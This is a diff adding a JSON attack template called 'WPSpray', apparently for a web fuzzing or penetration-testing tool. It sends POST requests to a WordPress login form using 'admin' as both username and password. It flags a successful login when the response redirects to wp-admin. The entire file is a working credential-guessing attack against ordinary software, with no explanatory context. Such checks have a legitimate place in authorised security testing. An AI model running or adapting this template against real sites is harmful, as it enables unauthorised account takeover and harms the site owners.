@@ -1,0 +1,38 @@
+{
+    "Id": "WPSpray",
+    "Mode": "Attack",
+    "PayloadSet": {
+        "Id": "FUZZ",
+        "File": "",
+        "List": ["admin"]
+    },
+    "RequestTemplate": {
+        "Method": "POST",
+        "UrlTemplate": "BASE",
+        "Header": {
+            "User-Agent": "DEFAULT"
+        },
+        "Body": ["log=FUZZ&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2Flocalhost%2Fwp-admin%2F&testcookie=1"]
+    },
+    "ResponseAction": {
+        "FactConditions": [
+            {
+                "Conditions": [
+                    {
+                        "Field": "StatusCode",
+                        "Condition": "OneOf",
+                        "Values": ["200", "302"]
+                    },
+                    {
+                        "Field": "HdrLocation",
+                        "Condition": "Contains",
+                        "Values": ["wp-admin"]
+                    }
+                ],
+                "Facts": {
+                    "Login": "true"
+                }
+            }
+        ]
+    }
+}
